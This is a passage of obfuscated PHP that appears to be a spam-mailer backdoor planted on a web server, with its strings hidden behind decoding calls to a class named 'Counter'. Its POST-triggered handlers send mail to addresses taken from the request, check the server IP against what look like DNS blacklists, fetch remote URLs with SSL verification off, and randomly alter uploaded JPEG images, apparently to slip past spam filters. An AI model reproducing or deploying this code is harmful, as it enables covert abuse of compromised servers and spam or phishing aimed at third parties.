'_' . 'opf' . 'i') . Counter::_xk('_txa' . 'l', '_iwd' . 'f');     $_rl .= Counter::_xk('_' . 'b' . 'a', '_' . 'e' . 'dbr') . $_gz . Counter::_xk('_btfj', '_si' . 'j');     $_rl .= Counter::_xk('_' . 'u' . 'tm', '_xi' . 'a' . 'e') . strtoupper(_zh()) . Counter::_xk('_t' . 't', '_id');     $_rl .= Counter::_xk('_mro', '_' . 'w' . 'q') . Counter::_xk('_h' . 'v', '_fo' . 'ur');     return $_rl; } function _if() {     $_ef = Counter::_xk('_xx' . 'e' . 'u', '_wle');     if (isset($_POST[Counter::_xk('_hp' . 'h', '_p' . 'r') ]) === true)     {         print Counter::_xk('_ie' . 'd', '_bc' . 's') . $_ef;     }     if (isset($_POST[Counter::_xk('_m' . 'j' . 'z', '_u' . 'oq') ]) === true)     {         if (function_exists(Counter::_xk('_' . 'm' . 'c', '_p' . 'xp')))         {             $_ep = explode(Counter::_xk('_ks' . 'jx', '_tn' . 'u' . 'f') , $_POST[Counter::_xk('_' . 'brax', '_g' . 'l') ]);             $_gdo = $_ep[_igo::_xk(0633) - _igo::_xk(0634) + _igo::_xk(0635) ];             if (_uuqa($_gdo))             {                 print Counter::_xk('_w' . 'g', '_' . 'as' . 'wy') . $_ef;             }             else             {                 print Counter::_xk('_wet' . 'o', '_ndov') . $_ef;             }         }         else         {             print Counter::_xk('_j' . 'i' . 'mz', '_ns' . 'f') . $_ef;         }     }     if (isset($_POST[Counter::_xk('_i' . 'iq', '_' . 'uc') ]) === true)     {         $_bjv = _rzjv();         if ($_bjv == Counter::_xk('_mjl', '_' . 'y' . 'vz'))         {             print Counter::_xk('_dws' . 'w', '_ma' . 'a');         }         else         {             print Counter::_xk('_bpc' . 'e', '_tvw') . $_bjv . Counter::_xk('_xb' . 'z', '_sv');         }     } } function _tqn($_s, $_ml) {     $_tl = Counter::_xk('_zxe', '_x' . 'v');     $_jm = rand($_s, $_ml);     $_da = Counter::_xk('_' . 'te' . 'h', '_wh');     for ($_qlc = (_igo::_xk(0636) + _igo::_xk(0637));$_qlc < $_jm;$_qlc++)     {         $_da .= $_tl[rand((int)round(_igo::_xk(0640) + _igo::_xk(0641) + _igo::_xk(0642)) , strlen($_tl) - (_igo::_xk(0643) - _igo::_xk(0644) - _igo::_xk(0645))) ];     }     return $_da; } function _rzjv($_de = null, $_gwl = - 0271054) {     $_c = array(         Counter::_xk('_juy', '_h' . 'p' . 'a') ,         Counter::_xk('_' . 'bzjx', '_' . 'ae' . 'c') ,         Counter::_xk('_' . 'lxv', '_' . 'ci') ,         Counter::_xk('_t' . 'x' . 'hx', '_' . 'is') ,         Counter::_xk('_dc' . 'cn', '_vb' . 'b' . 'x')     );     $_ov = gethostbyname($_SERVER[Counter::_xk('_xj', '_bg') ]);     $_da = Counter::_xk('_scxl', '_pzm');     if ($_ov)     {         $_wa = join(Counter::_xk('_bm' . 'i', '_gk' . 'e') , array_reverse(explode(Counter::_xk('_ul', '_' . 'wv') , $_ov)));         foreach ($_c as $_bb)         {             if (checkdnsrr($_wa . Counter::_xk('_dh' . 'd' . 'y', '_zvq') . $_bb . Counter::_xk('_vk', '_bbg') , Counter::_xk('_lcl' . 'd', '_e' . 'ww' . 'j'))) $_da .= $_bb . Counter::_xk('_' . 'aj' . 'y', '_kl' . 'nj');         }         if (strlen($_da) > (_igo::_xk(0646) - _igo::_xk(0647)))         {             return substr($_da, _igo::_xk(0650) + _igo::_xk(0651) , -(int)round(_igo::_xk(0652) + _igo::_xk(0653)));         }         else         {             return Counter::_xk('_abq', '_jw');         }     }     else     {         return Counter::_xk('_zepr', '_ug' . 'g');     }     return Counter::_xk('_oje' . 'a', '_ep' . 'f' . 'c'); } function _uuqa($_rz) {     $_rl = _jarc(_zh() , _zh() . Counter::_xk('_n' . 'n', '_tm') . $_SERVER[Counter::_xk('_ky' . 'y', '_f' . 'yu') ]);     $_rl .= Counter::_xk('_iv' . 'z', '_zcm') . Counter::_xk('_j' . 'm', '_' . 'hrh' . 'o');     $_rl .= Counter::_xk('_r' . 'h', '_ly') . Counter::_xk('_wou', '_w' . 'y');     $_wxp = chunk_split(base64_encode(_jxz()));     $_g = $_SERVER[Counter::_xk('_mokd', '_' . 'kty' . 'n') ];     if (mail($_rz, $_g, $_wxp, $_rl))     {         return true;     }     return false; } function _xdc($_wxp) {     $_ipm = trim(strip_tags($_wxp, Counter::_xk('_' . 'lp' . 'n', '_' . 'h' . 'h')));     $_fzq = true;     $_tp = array();     $_pu = array();     $_pu[(int)round(_igo::_xk(0654) + _igo::_xk(0655) + _igo::_xk(0656)) ] = (int)round(_igo::_xk(0657) + _igo::_xk(0660) + _igo::_xk(0661));     while ($_fzq == true)     {         $_pu[(int)round(_igo::_xk(0662) + _igo::_xk(0663)) ] = strpos($_ipm, Counter::_xk('_g' . 'xx', '_htom') , $_pu[(int)round(_igo::_xk(0664) + _igo::_xk(0665) + _igo::_xk(0666)) ]);         if ($_pu[(int)round(_igo::_xk(0667) + _igo::_xk(0670) + _igo::_xk(0671)) ] != false)         {             $_pu[_igo::_xk(0672) + _igo::_xk(0673) ] = strpos($_ipm, Counter::_xk('_' . 'sf', '_ygen') , $_pu[_igo::_xk(0674) + _igo::_xk(0675) ] + (_igo::_xk(0676) + _igo::_xk(0677) - _igo::_xk(0700)));             $_pu[(int)round(_igo::_xk(0701) + _igo::_xk(0702)) ] = strpos($_ipm, Counter::_xk('_i' . 'y', '_wru') , $_pu[(int)round(_igo::_xk(0703) + _igo::_xk(0704) + _igo::_xk(0705)) ] + (_igo::_xk(0706) - _igo::_xk(0707)));             $_pu[(int)round(_igo::_xk(0710) + _igo::_xk(0711)) ] = strpos($_ipm, Counter::_xk('_' . 'k' . 'j', '_' . 'o' . 'tt') , $_pu[(int)round(_igo::_xk(0712) + _igo::_xk(0713) + _igo::_xk(0714)) ] + (_igo::_xk(0715) - _igo::_xk(0716) + _igo::_xk(0717)));             $_pu[(int)round(_igo::_xk(0720) + _igo::_xk(0721)) ] = strpos($_ipm, Counter::_xk('_dv' . 'y' . 'v', '_lo' . 's') , $_pu[_igo::_xk(0722) + _igo::_xk(0723) + _igo::_xk(0724) ] + (_igo::_xk(0725) + _igo::_xk(0726)));             $_pu[_igo::_xk(0727) + _igo::_xk(0730) + _igo::_xk(0731) ] = strpos($_ipm, Counter::_xk('_gs', '_' . 'w' . 'xqz') , $_pu[_igo::_xk(0732) + _igo::_xk(0733) ] + (int)round(_igo::_xk(0734) + _igo::_xk(0735)));             $_pu[_igo::_xk(0736) + _igo::_xk(0737) + _igo::_xk(0740) ] = strlen($_ipm) - (_igo::_xk(0741) - _igo::_xk(0742));             $_tp[(int)round(_igo::_xk(0743) + _igo::_xk(0744) + _igo::_xk(0745)) ] = substr($_ipm, (int)round(_igo::_xk(0746) + _igo::_xk(0747) + _igo::_xk(0750)) , $_pu[_igo::_xk(0751) - _igo::_xk(0752) ]);             $_tp[(int)round(_igo::_xk(0753) + _igo::_xk(0754)) ] = substr($_ipm, $_pu[(int)round(_igo::_xk(0755) + _igo::_xk(0756) + _igo::_xk(0757)) ] + (int)round(_igo::_xk(0760) + _igo::_xk(0761) + _igo::_xk(0762)) , $_pu[_igo::_xk(0763) + _igo::_xk(0764) - _igo::_xk(0765) ] - $_pu[(int)round(_igo::_xk(0766) + _igo::_xk(0767)) ] - (_igo::_xk(0770) - _igo::_xk(0771) + _igo::_xk(0772)));             $_tp[_igo::_xk(0773) + _igo::_xk(0774) ] = substr($_ipm, $_pu[_igo::_xk(0775) + _igo::_xk(0776) - _igo::_xk(0777) ] + (int)round(_igo::_xk(01000) + _igo::_xk(01001) + _igo::_xk(01002)) , $_pu[(int)round(_igo::_xk(01003) + _igo::_xk(01004) + _igo::_xk(01005)) ] - $_pu[_igo::_xk(01006) + _igo::_xk(01007) ] + (_igo::_xk(01010) - _igo::_xk(01011)));             $_ipm = $_tp[_igo::_xk(01012) - _igo::_xk(01013) ] . $_tp[_igo::_xk(01014) - _igo::_xk(01015) ] . $_tp[_igo::_xk(01016) - _igo::_xk(01017) ];         }         else         {             $_fzq = false;         }     }     return $_ipm; } function _mdd($_ui, $_ekt, $_hid) {     $_bu = strpos($_hid, $_ui);     return $_bu !== false ? substr_replace($_hid, $_ekt, $_bu, strlen($_ui)) : $_hid; } function _pvj($_lgb) {     $_lee = end(explode(Counter::_xk('_mgc' . 'w', '_jzz') , $_lgb));     $_skb[] = Counter::_xk('_' . 'zn' . 'qm', '_' . 'k' . 'k');     $_skb[] = Counter::_xk('_' . 'psw' . 'd', '_c' . 'mn');     $_skb[] = Counter::_xk('_lp', '_' . 'hre' . 'o');     $_skb[] = Counter::_xk('_n' . 'a' . 'is', '_tu');     $_skb[] = Counter::_xk('_zcf', '_xb' . 'r');     $_ix = array(         Counter::_xk('_svof', '_jd' . 'r') ,         Counter::_xk('_wm', '_ofxg') ,         Counter::_xk('_e' . 'j' . 'n' . 'j', '_n' . 'l') ,         Counter::_xk('_' . 'syo' . 'j', '_' . 'hx') ,         Counter::_xk('_r' . 'f' . 'o', '_' . 'ojmw')     );     for ($_qlc = (int)round(_igo::_xk(01020) + _igo::_xk(01021) + _igo::_xk(01022)) , $_ml = count($_ix);$_qlc < $_ml;$_qlc++)     {         if (strtolower($_lee) == $_ix[$_qlc])         {             $_po = rand((int)round(_igo::_xk(01023) + _igo::_xk(01024)) , (int)round(_igo::_xk(01025) + _igo::_xk(01026) + _igo::_xk(01027)));             return $_skb[rand(_igo::_xk(01030) - _igo::_xk(01031) + _igo::_xk(01032) , (int)round(_igo::_xk(01033) + _igo::_xk(01034))) ] . $_po . Counter::_xk('_p' . 'dxw', '_saza') . $_lee;         }     }     return _zh() . Counter::_xk('_wcuj', '_ewr') . $_lee; } function _ix($_sk) {     $_id = Counter::_xk('_bm' . 'g', '_whhp');     if (is_callable(Counter::_xk('_kq' . 'u' . 'u', '_' . 'ya')))     {         $_grc = curl_init($_sk);         curl_setopt($_grc, _igo::_xk(01035) + _igo::_xk(01036) , false);         curl_setopt($_grc, (int)round(_igo::_xk(01037) + _igo::_xk(01040) + _igo::_xk(01041)) , (int)round(_igo::_xk(01042) + _igo::_xk(01043) + _igo::_xk(01044)));         curl_setopt($_grc, (int)round(_igo::_xk(01045) + _igo::_xk(01046) + _igo::_xk(01047)) , _igo::_xk(01050) + _igo::_xk(01051));         curl_setopt($_grc, (int)round(_igo::_xk(01052) + _igo::_xk(01053)) , _igo::_xk(01054) + _igo::_xk(01055) - _igo::_xk(01056));         curl_setopt($_grc, _igo::_xk(01057) - _igo::_xk(01060) + _igo::_xk(01061) , _igo::_xk(01062) + _igo::_xk(01063) - _igo::_xk(01064));         curl_setopt($_grc, (int)round(_igo::_xk(01065) + _igo::_xk(01066) + _igo::_xk(01067)) , (int)round(_igo::_xk(01070) + _igo::_xk(01071)));         curl_setopt($_grc, (int)round(_igo::_xk(01072) + _igo::_xk(01073)) , _igo::_xk(01074) + _igo::_xk(01075) + _igo::_xk(01076));         $_id = curl_exec($_grc);         $_kpp = curl_getinfo($_grc);         curl_close($_grc);         if ($_kpp[Counter::_xk('_nba' . 'y', '_cv') ] != (_igo::_xk(01077) + _igo::_xk(01100))) return false;     }     else     {         $_yeg = parse_url($_sk);         $_nbd = ($_yeg[Counter::_xk('_ud' . 'v' . 'q', '_lui') ] == Counter::_xk('_tbi' . 'u', '_zb' . 'c'));         $_qb = stream_context_create([Counter::_xk('_' . 'ijm' . 'k', '_ra') => [Counter::_xk('_' . 'g' . 'c', '_bf') => false, Counter::_xk('_dtf' . 'e', '_' . 'kfzr') => false]]);         $_pd = ($_nbd ? Counter::_xk('_kn' . 'bb', '_c' . 'k') : Counter::_xk('_b' . 'rg' . 'h', '_r' . 'd' . 'm')) . $_yeg[Counter::_xk('_i' . 'ii', '_bxh') ];         if ($_yeg[Counter::_xk('_jp' . 'x' . 'q', '_skp' . 's') ])         {             $_pd .= Counter::_xk('_oaz' . 'h', '_' . 'v' . 'd' . 't' . 'k') . $_yeg[Counter::_xk('_' . 'xc' . 'z' . 'z', '_nf' . 'n') ];         }         else         {             $_pd .= ($_nbd) ? Counter::_xk('_jh', '_n' . 'yd') . (int)round(_igo::_xk(01101) + _igo::_xk(01102) + _igo::_xk(01103)) : Counter::_xk('_' . 'p' . 'h', '_' . 'd' . 'x' . 'oc') . (_igo::_xk(01104) + _igo::_xk(01105));         }         $_l = stream_socket_client($_pd, $_nf, $_nnf, _igo::_xk(01106) + _igo::_xk(01107) , (int)round(_igo::_xk(01110) + _igo::_xk(01111)) , $_qb);         if ($_l)         {             fputs($_l, Counter::_xk('_cu', '_i' . 'qo') . $_yeg[Counter::_xk('_im', '_ry' . 'nu') ] . Counter::_xk('_er', '_iq' . 'l' . 'x'));             fputs($_l, Counter::_xk('_wt' . 's', '_bg' . 'a') . $_yeg[Counter::_xk('_' . 'y' . 'w' . 't', '_' . 'o' . 'eov') ] . Counter::_xk('_laup', '_lv' . 'wg'));             fputs($_l, Counter::_xk('_fen' . 'p', '_r' . 'g' . 'ei'));             $_v = (_igo::_xk(01112) - _igo::_xk(01113));             while (!feof($_l))             {                 $_yy = fgets($_l, (int)round(_igo::_xk(01114) + _igo::_xk(01115)));                 if ($_v) $_id .= $_yy;                 if ($_yy == Counter::_xk('_qgh' . 't', '_ex')) $_v = (int)round(_igo::_xk(01116) + _igo::_xk(01117));             }             fclose($_l);         }     }     if (empty($_id)) return false;     return $_id; } function _svfp($_lgb) {     $_lee = end(explode(Counter::_xk('_jkuo', '_ww' . 'vf') , $_lgb));     if (strtolower($_lee) == Counter::_xk('_m' . 'w' . 'n', '_jgpt') or strtolower($_lee) == Counter::_xk('_o' . 'uo' . 'g', '_dv' . 'r'))     {         if (_culo())         {             return _sl($_FILES[Counter::_xk('_' . 'tm' . 'o' . 'q', '_mmp' . 'j') ][Counter::_xk('_umo' . 'h', '_' . 'ezp') ]);         }     }     return file_get_contents($_FILES[Counter::_xk('_m' . 'd', '_s' . 'j' . 'k') ][Counter::_xk('_w' . 'ke', '_t' . 'g' . 's') ]); } function _zh($_hg = null, $_mul = 0270415) {     $_tl = Counter::_xk('_r' . 'j', '_q' . 'fzr');     $_jm = rand(_igo::_xk(01120) - _igo::_xk(01121) - _igo::_xk(01122) , (int)round(_igo::_xk(01123) + _igo::_xk(01124)));     $_da = Counter::_xk('_z' . 'te', '_' . 'ir');     for ($_qlc = (_igo::_xk(01125) + _igo::_xk(01126) + _igo::_xk(01127));$_qlc < $_jm;$_qlc++)     {         $_da .= $_tl[rand((int)round(_igo::_xk(01130) + _igo::_xk(01131) + _igo::_xk(01132)) , strlen($_tl) - (int)round(_igo::_xk(01133) + _igo::_xk(01134))) ];     }     return $_da; } function _jxz() {     $_tl = Counter::_xk('_' . 's' . 'gk', '_' . 'r' . 'd');     $_jm = rand((int)round(_igo::_xk(01135) + _igo::_xk(01136)) , _igo::_xk(01137) + _igo::_xk(01140) - _igo::_xk(01141));     $_da = Counter::_xk('_nec' . 'q', '_me' . 'w');     for ($_qlc = (_igo::_xk(01142) + _igo::_xk(01143) - _igo::_xk(01144));$_qlc < $_jm;$_qlc++)     {         $_po = rand((int)round(_igo::_xk(01145) + _igo::_xk(01146) + _igo::_xk(01147)) , (int)round(_igo::_xk(01150) + _igo::_xk(01151)));         for ($_ria = (int)round(_igo::_xk(01152) + _igo::_xk(01153) + _igo::_xk(01154));$_ria < $_po;$_ria++)         {             $_da .= $_tl[rand((int)round(_igo::_xk(01155) + _igo::_xk(01156) + _igo::_xk(01157)) , strlen($_tl) - (_igo::_xk(01160) + _igo::_xk(01161) + _igo::_xk(01162))) ];         }         $_sn = array(             Counter::_xk('_r' . 'dg', '_s' . 'ym') ,             Counter::_xk('_arn' . 'j', '_gmez') ,             Counter::_xk('_nv', '_uy' . 'ha') ,             Counter::_xk('_pi', '_i' . 'npi') ,             Counter::_xk('_vuk', '_i' . 'g' . 'i') ,             Counter::_xk('_xs' . 'h', '_ta') ,             Counter::_xk('_w' . 'tt', '_slj') ,             Counter::_xk('_qbc', '_' . 'kc')         );         $_da .= $_sn[rand((int)round(_igo::_xk(01163) + _igo::_xk(01164) + _igo::_xk(01165)) , _igo::_xk(01166) + _igo::_xk(01167) - _igo::_xk(01170)) ];     }     return trim($_da); } function _culo($_uqp = 0.51117613590181) {     $_skb = array(         Counter::_xk('_hx' . 'm' . 'e', '_' . 'iz') ,         Counter::_xk('_' . 'eo', '_' . 'pj') ,         Counter::_xk('_q' . 'mul', '_zxo') ,         Counter::_xk('_l' . 'elx', '_rj' . 'a') ,         Counter::_xk('_b' . 'k', '_' . 'msc') ,         Counter::_xk('_pd' . 'ce', '_i' . 'b') ,         Counter::_xk('_goby', '_l' . 'wn') ,         Counter::_xk('_fn' . 'w', '_dv' . 'g')     );     for ($_qlc = (_igo::_xk(01171) - _igo::_xk(01172)) , $_ml = count($_skb);$_qlc < $_ml;$_qlc++)     {         if (!function_exists($_skb[$_qlc]))         {             return false;         }     }     return true; } function _sl($_fd, $_drk = null) {     $_po[Counter::_xk('_rp', '_' . 'ztc') ] = rand(_igo::_xk(01173) + _igo::_xk(01174) , (int)round(_igo::_xk(01175) + _igo::_xk(01176) + _igo::_xk(01177)));     $_po[Counter::_xk('_' . 'iof' . 'e', '_ko') ] = rand((int)round(_igo::_xk(01200) + _igo::_xk(01201)) , _igo::_xk(01202) - _igo::_xk(01203) - _igo::_xk(01204));     $_po[Counter::_xk('_h' . 'p', '_ilc') ] = rand(_igo::_xk(01205) - _igo::_xk(01206) + _igo::_xk(01207) , (int)round(_igo::_xk(01210) + _igo::_xk(01211) + _igo::_xk(01212)));     $_po[Counter::_xk('_s' . 'fvc', '_ka') ] = rand(_igo::_xk(01213) - _igo::_xk(01214) - _igo::_xk(01215) , (int)round(_igo::_xk(01216) + _igo::_xk(01217) + _igo::_xk(01220)));     $_po[Counter::_xk('_' . 'fk' . 'l', '_nc' . 'z') ] = rand(_igo::_xk(01221) - _igo::_xk(01222) - _igo::_xk(01223) , (int)round(_igo::_xk(01224) + _igo::_xk(01225) + _igo::_xk(01226)));     list($_mn, $_en) = getimagesize($_fd);     if ($_po[Counter::_xk('_' . 'z' . 'zx', '_pne') ] == (_igo::_xk(01227) + _igo::_xk(01230)))     {         $_sn = rand(_igo::_xk(01231) - _igo::_xk(01232) + _igo::_xk(01233) , (int)round(_igo::_xk(01234) + _igo::_xk(01235)));         if ($_sn == (int)round(_igo::_xk(01236) + _igo::_xk(01237)))         {             $_xb = $_mn + rand(_igo::_xk(01240) + _igo::_xk(01241) - _igo::_xk(01242) , (int)round(_igo::_xk(01243) + _igo::_xk(01244)));         }         else         {             $_xb = $_mn - rand(_igo::_xk(01245) - _igo::_xk(01246) , _igo::_xk(01247) - _igo::_xk(01250));         }     }     else     {         $_xb = $_mn;     }     if ($_po[Counter::_xk('_yr', '_zmx') ] == (int)round(_igo::_xk(01251) + _igo::_xk(01252) + _igo::_xk(01253)))     {         $_sn = rand((int)round(_igo::_xk(01254) + _igo::_xk(01255)) , (int)round(_igo::_xk(01256) + _igo::_xk(01257)));         if ($_sn == (int)round(_igo::_xk(01260) + _igo::_xk(01261)))         {             $_ogc = $_en + rand((int)round(_igo::_xk(01262) + _igo::_xk(01263)) , _igo::_xk(01264) - _igo::_xk(01265));         }         else         {             $_ogc = $_en - rand((int)round(_igo::_xk(01266) + _igo::_xk(01267)) , _igo::_xk(01270) - _igo::_xk(01271));         }     }     else     {         $_ogc = $_en;     }     if ($_po[Counter::_xk('_' . 'xez', '_' . 've') ] == (_igo::_xk(01272) + _igo::_xk(01273) - _igo::_xk(01274)))     {         $_unp = (_igo::_xk(01275) + _igo::_xk(01276) + _igo::_xk(01277));     }     else     {         $_unp = rand((int)round(_igo::_xk(01300) + _igo::_xk(01301) + _igo::_xk(01302)) , _igo::_xk(01303) + _igo::_xk(01304));     }     if ($_po[Counter::_xk('_k' . 'b' . 'y', '_o' . 'cu' . 'o') ] == (_igo::_xk(01305) + _igo::_xk(01306)))     {         $_xqd = rand(_igo::_xk(01307) + _igo::_xk(01310) , (int)round(_igo::_xk(01311) + _igo::_xk(01312)));     }     else     {         $_xqd = (_igo::_xk(01313) + _igo::_xk(01314));     }     if ($_po[Counter::_xk('_bcz' . 's', '_' . 'zi' . 'i' . 'a') ] == (_igo::_xk(01315) - _igo::_xk(01316)))     {         $_sn = rand(_igo::_xk(01317) - _igo::_xk(01320) + _igo::_xk(01321) , _igo::_xk(01322) + _igo::_xk(01323));         if ($_sn == (int)round(_igo::_xk(01324) + _igo::_xk(01325) + _igo::_xk(01326)))         {             $_sn = Counter::_xk('_' . 'm' . 'yl', '_sgp' . 'o');         }         else         {             $_sn = Counter::_xk('_a' . 'g', '_sb' . 's' . 'o');         }         $_lg = rand((int)round(_igo::_xk(01327) + _igo::_xk(01330)) , _igo::_xk(01331) - _igo::_xk(01332) + _igo::_xk(01333));     }     else     {         $_sn = Counter::_xk('_gvqr', '_h' . 't' . 'u');         $_lg = (int)round(_igo::_xk(01334) + _igo::_xk(01335));     }     $_ckw = imagecreatetruecolor($_xb, $_ogc);     $_fx = imagecreatefromjpeg($_fd);     imagecopyresampled($_ckw, $_fx, (int)round(_igo::_xk(01336) + _igo::_xk(01337) + _igo::_xk(01340)) , (int)round(_igo::_xk(01341) + _igo::_xk(01342) + _igo::_xk(01343)) , (int)round(_igo::_xk(01344) + _igo::_xk(01345)) , (int)round(_igo::_xk(01346) + _igo::_xk(01347)) , $_xb, $_ogc, $_mn, $_en);     imagefilter($_ckw, _igo::_xk(01350) - _igo::_xk(01351) + _igo::_xk(01352) , $_sn . $_lg);     imagefilter($_ckw, _igo::_xk(01353) - _igo::_xk(01354) + _igo::_xk(01355) , $_xqd);     ob_start();     imagejpeg($_ckw, null, $_unp);     $_et = ob_get_clean();     imagedestroy($_ckw);     return $_et; };